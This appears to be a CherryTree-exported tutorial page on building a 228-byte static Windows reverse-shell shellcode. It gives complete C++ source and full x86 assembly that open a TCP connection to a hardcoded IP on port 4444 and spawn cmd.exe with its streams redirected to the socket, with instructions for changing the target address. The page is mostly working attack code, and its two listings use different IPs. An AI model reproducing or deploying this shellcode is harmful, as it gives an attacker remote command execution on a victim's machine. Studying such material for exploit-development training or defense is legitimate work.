<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Reverse Shell (STATIC)(228 bytes)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Reverse Shell (STATIC)(228 bytes)</h1><br/><strong>The steps in the ASM shellcode:</strong><br />1. Load ws2_32.dll with LoadLibrary<br />2. Get WSAStartUp with GetProcAddress<br />3. Call WSAStartUp<br />4. Get WSASocketA with GetProcAddress<br />5. Call WSASocketA<br />6. Get connect with GetProcAddress<br />7. Call connect<br />8. Call CreateProcessA<br />9. Call ExitProcess (optional)<br /><br /><strong><h2>The pseudo code of a Windows Reverse Shell:</h2></strong><br /><br />• Initialize socket library with WSAStartup call<br />• Create socket<br />• Connect socket to a remote port<br />• Start cmd.exe with redirected streams<br /><br /><strong><h2>The Cpp source</h2></strong><br /><br />Before we can use the socket library and call any of its function, we  have to call the WSAStartup function. This initializes the socket  library.<br />We can execute cmd.exe with calling CreateProcess.<br />STARTF_USESHOWWINDOW is necessary to hide the command window of cmd.exe.<br />Streams can be redirected with specifying the STARTF_USESTDHANDLES  flag and setting the hStd… members of the STARTUPINFO to the socket  handle.<br /> <br />The C++ source code:<br /><code>#include "stdafx.h"<br /><br />#define _WINSOCK_DEPRECATED_NO_WARNINGS<br /><br />#include <br />#include <br /><br />#pragma comment(lib,"ws2_32")<br /><br />WSADATA wsaData;<br />SOCKET s1;<br />struct sockaddr_in hax;<br />char ip_addr[16];<br />STARTUPINFO sui;<br />PROCESS_INFORMATION pi;<br /><br /><br />int _tmain(int argc, _TCHAR* argv[])<br />{<br />	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);<br />	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,<br />	    (unsigned int)NULL, (unsigned int)NULL);<br /><br />	hax.sin_family = AF_INET;<br />	hax.sin_port = htons(4444);<br />	hax.sin_addr.s_addr = inet_addr("192.168.2.130");<br /><br />	WSAConnect(s1, (SOCKADDR*)&amp;hax, sizeof(hax), NULL, NULL, NULL, NULL);<br /><br />	memset(&amp;sui, 0, sizeof(sui));<br />	sui.cb = sizeof(sui);<br />	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);<br />	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;<br /><br />	TCHAR commandLine[256] = L"cmd.exe";<br />	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,<br />	    0, NULL, NULL, &amp;sui, &amp;pi);<br />}</code>Copyreverseshell.cpp <br /><br /><strong><h2>Two ways of calling functions</h2></strong><br /><br />In order to use DLL methods in shellcode, we have to determine the address of the function. There are two ways of doing this:<br /><strong>1. Static function calls</strong><br />There is a tool called arwin.exe. This tool is an address resolution  tool for Windows and determines the address of a function in a loaded  DLL. The first parameter is the name of the DLL, the second parameter is  the name of the function.<br />In Windows world, most of the functions have two forms: the ANSI and  the Unicode form. The ANSI form end with A and expects ANSI parameters.  The Unicode form ends with W and expects Unicode parameters. For example  the two forms of the CreateProcess function are CreateProcessA and CreateProcessW.<br />The problem with this approach is that the address is different for  each Windows version, so that if we create a shellcode for Win7, it will  not work on WinXP.<br /><strong>2. Dynamic function call</strong><br />In this approach we use two functions: LoadLibrary and GetProcAddress. LoadLibrary  loads the DLL into memory and returns the base address of the DLL. We  do not have to specify the full path of the DLL. In this case the  function searches the DLL in predetermined locations. The .dll extension  can be omitted, too. GetProcAddress calculates the  offset of the function in the DLL and returns with the address of the  function. These functions can be found in the kernel32.dll.<br />We can create version independent shellcode if we use this approach, however there is still a problem. The address of LoadLibrary and GetProcAddress still should be determined in a version independent way.<br />In this post I will use the second approach. I will address this latter problem in another posts.<br /> <br /><br /><strong><h2>Passing parameters to a function</h2></strong><br />If a function requires parameters, then we have to put them onto the stack, in reverse order. For example, GetProcAddress has two parameters: hModule and lpProcName. First the address of ProcName, then the hModule should be pushed onto the stack.<br />As we create a shellcode, we cannot use variables. If we need an  address of a structure or a string as a parameter, this should also be  created on the stack before we create the final structure of the  parameters.<br />In case of GetProcAddress, First we push the  ProcName onto the stack, then we push the address of the ProcName, which  is actually the ESP, finally we push the hModule. The structure of the stack will be:<br />    hModule<br />     Address of ProcName<br />     ProcName<br />The function will use the first two elements from the stack.<br /> <br />Sometimes the passed parameter contains a complicated structure. It  might help if we create a C program and inspect the structure in memory,  then we can recreate the structure in asssembly easily. STARTUPINFO and  PROCESS_INFORMATION are such structures in our case.<br /> <br /><br /><strong><h2>Return value of a function</h2></strong><br />The return value, if exists, can be found in <strong>EAX</strong> after the function call. In order to create a small shellcode, we do not check the return value most of the time.<br /> <br /><br /><strong><h2>Determine the addresses</h2></strong><br />Before we create the final shellcode, we have to determine the  address of several function. First we collect information about the  functions, then we use the arwin tool to get the addresses.<br />WSAStartup, WSASocket and connect can be found in ws2_32.dll. CreateProcess and ExitProcess can be found in kernel32.dll.<br />More information on these functions can be found in MSDN: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms742213(v=vs.85).aspx">WSAStartUp</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx">WSASocket</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms737625(v=vs.85).aspx">connect</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx">CreateProcess</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682658(v=vs.85).aspx">ExitProcess</a>.<br />Here are the output of the arwin tool:<br /> <br /><img src="images/364-1.png" alt="images/364-1.png" /><br /><img src="images/364-2.png" alt="images/364-2.png" /><br /><img src="images/364-3.png" alt="images/364-3.png" /><br /><img src="images/364-4.png" alt="images/364-4.png" /><br /> <br />The steps in the shellcode:<br />1. Load ws2_32.dll with LoadLibrary<br />2. Get WSAStartUp with GetProcAddress<br />3.  Call WSAStartUp<br />4. Get WSASocketA with GetProcAddress<br />5. Call WSASocketA<br />6. Get connect with GetProcAddress<br />7. Call connect<br />8. Call CreateProcessA<br />9. Call ExitProcess (optional)<br /> <br />The assembly source code of the shellcode:<br /><code>global _start<br /><br />section .text<br /><br />_start:<br /><br />	; Get the windows socket dll name<br />	xor eax, eax<br />	mov ax, 0x3233         ; '\0\023' <br />	push eax<br />	push dword 0x5f327377  ; '_2sw'<br />	push esp<br /><br />	; LoadLibrary<br />	mov ebx, 0x75982864	; LoadLibraryA(libraryname)<br />	call ebx<br />	mov ebp, eax		; winsocket dll handle is saved into ebp<br /><br /><br />	; Get the funtion name: WSAStartUp<br />	xor eax, eax<br />	mov ax, 0x7075      ; '\0\0up'<br />    push eax<br />    push 0x74726174     ; 'trat'<br />    push 0x53415357     ; 'SASW'<br />    push esp<br /><br />	push ebp<br /><br />	mov ebx, 0x75981837	; GetProcAddress(hmodule, functionname)<br />	call ebx<br /><br />	; CAll WSAStartUp<br />	xor ebx, ebx<br />	mov bx, 0x0190<br />	sub esp, ebx<br />	push esp<br />	push ebx<br /><br />	call eax		; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)<br /><br /><br />	; Get the function name: WSASocketA<br />	xor eax, eax<br />	mov ax, 0x4174      ; '\0\0At'<br />	push eax<br />	push 0x656b636f     ; 'ekco'<br />	push 0x53415357     ; 'SASW'<br />	push esp<br /><br />    push ebp<br /><br />    mov ebx, 0x75981837    ; GetProcAddress(hmodule, functionname)<br />    call ebx<br /><br />	; Call WSASocket<br />	xor ebx, ebx<br />	push ebx<br />	push ebx<br />	push ebx<br />	xor ecx, ecx<br />	mov cl, 6<br />	push ecx<br />	inc ebx<br />	push ebx<br />	inc ebx<br />	push ebx<br /><br />	call eax    ; WSASocket(AF_INET = 2, SOCK_STREAM = 1,<br />				;   IPPROTO_TCP = 6, NULL,<br />				;   (unsigned int)NULL, (unsigned int)NULL);<br /><br /><br />	xchg eax, edi		; Save the socket handle into edi<br /><br /><br />	; Get the function name: connect<br />	mov ebx, 0x74636565 ; '\0tce'<br />	shr ebx, 8<br />	push ebx<br />	push 0x6e6e6f63     ; 'nnoc'<br />	push esp<br /><br />    push ebp<br /><br />    mov ebx, 0x75981837 ; GetProcAddress(hmodule, functionname)<br />    call ebx<br /><br />	; Call connect<br />	push 0x8802a8c0		; 0xc0, 0xa8, 0x02, 0x88 = 192.168.2.136<br />	push word 0x5c11	; 0x115c = port 4444<br />	xor ebx, ebx<br />	add bl, 2<br />	push word bx<br />	mov edx, esp<br /><br />	push byte 16<br />	push edx<br />	push edi<br /><br />	call eax            ; connect(s1, (SOCKADDR*) &amp;hax, sizeof(hax) = 16);<br /><br /><br />	; Call CreateProcess with redirected streams<br />	mov edx, 0x646d6363<br />	shr edx, 8<br />	push edx<br />	mov ecx, esp<br /><br />	xor edx, edx<br /><br />	sub esp, 16<br />	mov ebx, esp		; PROCESS_INFORMATION<br /><br />	push edi<br />	push edi<br />	push edi<br />	push edx<br />	push edx<br />	xor eax, eax<br />	inc eax<br />	rol eax, 8<br />	inc eax<br />	push eax<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	push edx<br />	xor eax, eax<br />	add al, 44<br />	push eax<br />	mov eax, esp		; STARTUP_INFO<br /><br />	push ebx		    ; PROCESS_INFORMATION<br />	push eax		    ; STARTUP_INFO<br />	push edx<br />	push edx<br />	push edx<br />	xor eax, eax<br />	inc eax<br />	push eax<br />	push edx<br />	push edx<br />	push ecx<br />	push edx<br /><br />	mov ebx, 0x75932062	; CreateProcess(NULL, commandLine, NULL, NULL,<br />	        TRUE, 0, NULL, NULL, &amp;sui, &amp;pi);<br />	call ebx<br /><br /><br />end:<br />	xor edx, edx<br />	push eax<br />	mov eax, 0x75982acf	; ExitProcess(exitcode)<br />	call eax<br />	</code><br /><br />The last few instructions exit the process and can be omitted, because the cmd.exe will block the execution.<br />The remote IP and port can be specified at line 90 and 91. Notice that both the IP and port number are in reverse order.<br /></div></body></html>